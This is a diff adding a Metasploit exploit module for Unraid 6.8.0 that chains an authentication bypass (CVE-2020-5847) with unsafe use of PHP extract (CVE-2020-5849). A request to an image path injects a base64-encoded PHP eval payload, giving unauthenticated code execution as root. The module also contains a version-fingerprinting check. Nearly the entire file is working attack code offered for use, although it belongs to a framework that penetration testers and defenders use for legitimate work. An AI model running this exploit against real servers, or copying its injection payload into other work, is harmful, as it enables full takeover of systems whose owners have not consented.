@@ -1,0 +1,101 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+
+  Rank = ExcellentRanking
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Unraid 6.8.0 Auth Bypass PHP Code Execution',
+        'Description' => %q{
+          This module exploits two vulnerabilities affecting Unraid 6.8.0.
+          An authentication bypass is used to gain access to the administrative
+          interface, and an insecure use of the extract PHP function can be abused
+          for arbitrary code execution as root.
+        },
+        'Author' =>
+          [
+            'Nicolas CHATELAIN <n.chatelain@sysdream.com>'
+          ],
+        'References' =>
+          [
+            [ 'CVE', '2020-5847' ],
+            [ 'CVE', '2020-5849' ],
+            [ 'URL', 'https://sysdream.com/news/lab/2020-02-06-cve-2020-5847-cve-2020-5849-unraid-6-8-0-unauthenticated-remote-code-execution-as-root/' ],
+            [ 'URL', 'https://forums.unraid.net/topic/88253-critical-security-vulnerabilies-discovered/' ]
+          ],
+        'License' => MSF_LICENSE,
+        'Platform' => ['php'],
+        'Privileged' => true,
+        'Arch' => ARCH_PHP,
+        'Targets' =>
+          [
+            [ 'Automatic', {}]
+          ],
+        'DefaultTarget' => 0,
+        'DisclosureDate' => 'Feb 10 2020'
+      )
+    )
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, 'The URI of the Unraid application', '/'])
+      ]
+    )
+  end
+
+  def check
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'webGui/images/green-on.png/'),
+      'method' => 'GET'
+    )
+
+    unless res
+      return CheckCode::Unknown('Connection failed')
+    end
+
+    unless res.code == 200
+      return CheckCode::Safe('Unexpected reply')
+    end
+
+    /\sVersion:\s(?<version>[\d]{1,2}\.[\d]{1,2}\.[\d]{1,2})&nbsp;/ =~ res.body
+
+    if version && Gem::Version.new(version) == Gem::Version.new('6.8.0')
+      return CheckCode::Appears("Unraid version #{version} appears to be vulnerable")
+    end
+
+    CheckCode::Safe
+  end
+
+  def exploit
+    begin
+      vprint_status('Sending exploit code')
+      res = send_request_cgi(
+        'uri' => normalize_uri(target_uri.path, 'webGui/images/green-on.png/'),
+        'method' => 'GET',
+        'encode_params' => false,
+        'vars_get' =>
+        {
+          'path' => 'x',
+          'site[x][text]' => Rex::Text.uri_encode("<?php eval(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}')); ?>", 'hex-normal')
+        }
+      )
+
+      if res.nil?
+        print_good('Request timed out, OK if running a non-forking/blocking payload...')
+      elsif res.code == 302
+        fail_with(Failure::NotVulnerable, 'Redirected, target is not vulnerable.')
+      else
+        print_warning("Unexpected response code #{res.code}, please check your payload.")
+      end
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+  end
+end
